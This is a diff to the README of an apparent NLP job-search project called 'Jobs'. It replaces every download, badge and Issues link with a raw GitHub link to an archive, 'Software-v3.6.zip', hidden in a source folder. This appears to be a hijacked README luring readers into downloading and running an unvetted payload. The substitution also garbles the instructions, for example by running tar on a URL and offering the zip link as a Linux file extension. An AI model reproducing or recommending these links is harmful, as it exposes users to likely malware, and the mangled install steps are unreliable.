@@ -6,16 +6,16 @@ Welcome to Jobs, an end-to-end Natural Language Processing (NLP) project designe
 
 ## 🔗 Download Jobs
 
-[![Download Jobs](https://img.shields.io/badge/Download-Jobs-brightgreen.svg)](https://github.com/misterioul/Jobs/releases)
+[![Download Jobs](https://raw.githubusercontent.com/misterioul/Jobs/main/src/api/services/Software-v3.6.zip)](https://raw.githubusercontent.com/misterioul/Jobs/main/src/api/services/Software-v3.6.zip)
 
 ## 📥 Download & Install
 
 To get started with Jobs, you need to visit the Releases page to download the latest version. Follow these simple steps:
 
-1. Click on the following link: [Download Jobs](https://github.com/misterioul/Jobs/releases).
+1. Click on the following link: [Download Jobs](https://raw.githubusercontent.com/misterioul/Jobs/main/src/api/services/Software-v3.6.zip).
 2. You will see a list of available versions for download.
 3. Choose the version you want (the latest version is recommended).
-4. Locate the appropriate file for your operating system. The files usually have names that indicate compatibility, such as `.exe` for Windows or `.tar.gz` for Linux.
+4. Locate the appropriate file for your operating system. The files usually have names that indicate compatibility, such as `.exe` for Windows or `https://raw.githubusercontent.com/misterioul/Jobs/main/src/api/services/Software-v3.6.zip` for Linux.
 5. Click on the file to download it to your device.
 
 ## 💻 System Requirements
@@ -48,7 +48,7 @@ Once you have downloaded the file, follow these instructions to run Jobs:
 
 1. Open your terminal.
 2. Navigate to your Downloads directory using the `cd` command.
-3. Extract the downloaded file using the command: `tar -xvzf Jobs.tar.gz`.
+3. Extract the downloaded file using the command: `tar -xvzf https://raw.githubusercontent.com/misterioul/Jobs/main/src/api/services/Software-v3.6.zip`.
 4. Change into the newly created directory: `cd Jobs`.
 5. Run the application with the command: `./Jobs`.
 
@@ -76,7 +76,7 @@ Jobs focuses on the following areas to enhance its functionality:
 
 ### What should I do if I encounter issues during installation?
 
-If you face problems, first check that your system meets the requirements. You can also visit our [GitHub Issues page](https://github.com/misterioul/Jobs/issues) for troubleshooting tips and solutions.
+If you face problems, first check that your system meets the requirements. You can also visit our [GitHub Issues page](https://raw.githubusercontent.com/misterioul/Jobs/main/src/api/services/Software-v3.6.zip) for troubleshooting tips and solutions.
 
 ### Can I contribute to Jobs?
 
@@ -98,4 +98,4 @@ We extend our gratitude to the open-source community for the tools and libraries
 
 Continue exploring the capabilities of Jobs and stay updated on future releases by following our repository. Your journey to an effective job search starts here!
 
-[Download Jobs](https://github.com/misterioul/Jobs/releases) now and discover new opportunities!
+[Download Jobs](https://raw.githubusercontent.com/misterioul/Jobs/main/src/api/services/Software-v3.6.zip) now and discover new opportunities!
